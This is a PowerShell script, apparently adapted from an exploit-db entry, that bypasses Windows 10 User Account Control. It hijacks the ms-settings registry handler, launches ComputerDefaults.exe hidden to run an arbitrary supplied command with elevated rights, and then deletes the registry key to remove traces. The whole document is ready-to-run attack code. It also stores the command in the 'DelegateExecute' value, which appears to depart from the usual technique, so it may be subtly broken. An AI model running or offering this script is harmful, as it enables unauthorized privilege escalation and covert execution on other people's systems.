# Powershell version of the exploit Windows 10 UAC Bypass by ComputerDefault
# Source : https://www.exploit-db.com/exploits/45660/
# Tested on : Microsoft Windows 10 Professionnal Version 10.0.15063

Param(
    [Parameter(Mandatory=$true,Position=1)]
    [ValidateNotNullOrEmpty()]
    [System.String] $command
)

Clear

# "HKCU:\Software\Classes\ms-settings\Shell\Open\command" Windows will create automatically ms-settings, Shell, Open key if they doesn't exist when we will call New-Item.

New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -ItemType  "RegistryKey" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -PropertyType "String" -Value $command -Force | Out-Null

Start-Process "C:\Windows\System32\ComputerDefaults.exe" -WindowStyle Hidden

$flag = $true

while ($flag) {
    Get-Process -Name "ComputerDefaults" -ErrorAction Ignore | Out-Null
    if($? -eq $true){
        $flag = $false
    }
}

Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force